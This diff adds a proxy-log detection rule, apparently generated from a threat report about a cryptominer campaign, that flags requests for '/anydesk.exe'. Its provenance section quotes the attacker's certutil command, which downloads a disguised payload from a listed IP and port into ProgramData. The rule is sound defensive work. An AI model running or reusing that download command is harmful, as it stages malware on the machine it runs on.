@@ -1,0 +1,31 @@
+title: Request for a URL path named in the source intelligence
+id: 4125c64d-b66f-4b53-abeb-e7ac2b2d7c28
+status: experimental
+description: Deterministic IOC rule built from the indicators the source intelligence published, with
+  no model involvement. Matches a proxy or web request for a current URL path the source published. URL
+  paths appear only in proxy and web logs, not in endpoint file or process events.
+references:
+- https://www.huntress.com/blog/threat-actor-compiles-cryptominer
+author: hecate (auto-generated from source indicators - requires analyst review)
+date: '2026-10-12'
+tags: []
+logsource:
+  category: proxy
+detection:
+  selection:
+    c-uri|contains:
+    - /anydesk.exe
+  condition: selection
+falsepositives:
+- Other sites serving a file at the same path
+level: high
+hecate_provenance:
+- value: http://194.87.89.30:8899/anydesk.exe
+  type: url
+  role: download
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/threat-actor-compiles-cryptominer
+  evidence: C:\Windows\System32\cmd.exe /c certutil -urlcache -split -f http://194.87.89.30:8899/anydesk.exe
+    C:\ProgramData\AnyDesk.exe 2>&1
+hunt_id: H-0728
